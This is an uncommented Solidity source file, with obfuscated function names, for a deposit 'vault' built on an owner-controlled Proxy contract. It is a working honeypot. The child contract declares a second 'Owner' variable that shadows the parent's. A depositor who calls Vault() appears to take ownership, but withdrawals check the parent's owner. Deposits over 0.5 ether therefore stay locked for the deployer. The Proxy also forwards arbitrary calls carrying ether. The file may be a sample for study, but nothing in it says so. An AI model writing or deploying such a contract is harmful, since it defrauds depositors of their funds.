// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x55e4df { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xa27629(address _0x0d9a28) public _0x55e4df { Owner = _0x0d9a28; }
    function _0xb5e671(address _0x8c946f, bytes data) public payable {
        _0x8c946f.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            if (block.timestamp > 0) { Owner = msg.sender; }
            _0xdaf108();
        }
    }

    function _0xdaf108() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0xc3d2ad(uint256 _0x660910) public _0x55e4df {
        if (_0x660910>0 && Deposits[msg.sender]>=_0x660910) {
            msg.sender.transfer(_0x660910);
        }
    }
}